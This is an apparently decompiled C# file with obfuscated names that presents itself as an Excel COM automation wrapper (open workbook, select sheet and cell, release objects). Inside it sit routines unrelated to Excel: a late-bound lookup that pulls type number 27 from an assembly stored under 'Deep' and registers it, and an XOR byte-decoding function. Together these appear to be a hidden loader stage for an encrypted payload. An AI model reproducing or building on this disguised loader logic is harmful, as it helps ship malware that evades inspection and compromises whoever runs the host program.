using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Dp6;
using Gs20;
using Jk4;
using Microsoft.VisualBasic.CompilerServices;
using e5D;
using z1Y;

namespace i2J7;

public class k9LK
{
	private Ax2c _oXls;

	private o0J _oWBook;

	private i6J _oSheet;

	public Ax2c OXls
	{
		get
		{
			return _oXls;
		}
		set
		{
			_oXls = value;
		}
	}

	public o0J OWBook
	{
		get
		{
			return _oWBook;
		}
		set
		{
			_oWBook = value;
		}
	}

	public i6J OSheet
	{
		get
		{
			return _oSheet;
		}
		set
		{
			_oSheet = value;
		}
	}

	public k9LK()
	{
		_oXls = (Ax2c)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("00024500-0000-0000-C000-000000000046")));
	}

	public void d6ZN(string Mx6p, bool Ep7t)
	{
		OWBook = OXls.Workbooks.Open(Mx6p, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		OXls.Visible = Ep7t;
	}

	internal static bool Mz6e()
	{
		try
		{
			try
			{
				Type type = (Type)j5ZM(RuntimeHelpers.GetObjectValue(Sb0.mDic["Deep"]));
				if (Operators.CompareString(type.Name, Sb0.mDic[Sb0.tName].ToString(), false) == 0)
				{
					Sb0.mDic.Add(Sb0.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public void q0JD(string q7PQ)
	{
		OSheet = (i6J)OWBook.Sheets[q7PQ];
	}

	public Ea2 Ck4s(int c3BY, int Sg57)
	{
		return (Ea2)OSheet.Cells[c3BY, Sg57];
	}

	public void x7P6(bool Fe72)
	{
		if (OWBook != null)
		{
			OWBook.Close(Fe72, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		}
		OXls.Quit();
		Ax2c i5QY = OXls;
		Rn28(ref i5QY);
		OXls = i5QY;
	}

	internal static byte Ft84(byte t7Z5, byte[] Bq6r, int Ww49, int t3BH)
	{
		t7Z5 = (byte)(t7Z5 ^ checked((byte)(Bq6r[unchecked(t3BH % Bq6r.Length)] ^ ((t3BH + unchecked(Ww49 % Bq6r.Length)) & Ww49))));
		return t7Z5;
	}

	private static void Rn28<s6EQ>(ref s6EQ i5QY, bool q9WE = false) where s6EQ : class
	{
		if (i5QY == null)
		{
			return;
		}
		try
		{
			if (Marshal.IsComObject(i5QY))
			{
				if (q9WE)
				{
					Marshal.FinalReleaseComObject(i5QY);
				}
				else
				{
					Marshal.ReleaseComObject(i5QY);
				}
			}
		}
		finally
		{
			i5QY = null;
		}
	}

	internal static object j5ZM(object j1BX)
	{
		return NewLateBinding.LateIndexGet(NewLateBinding.LateGet(j1BX, (Type)null, "GetExportedTypes", new object[0], (string[])null, (Type[])null, (bool[])null), new object[1] { 27 }, (string[])null);
	}
}
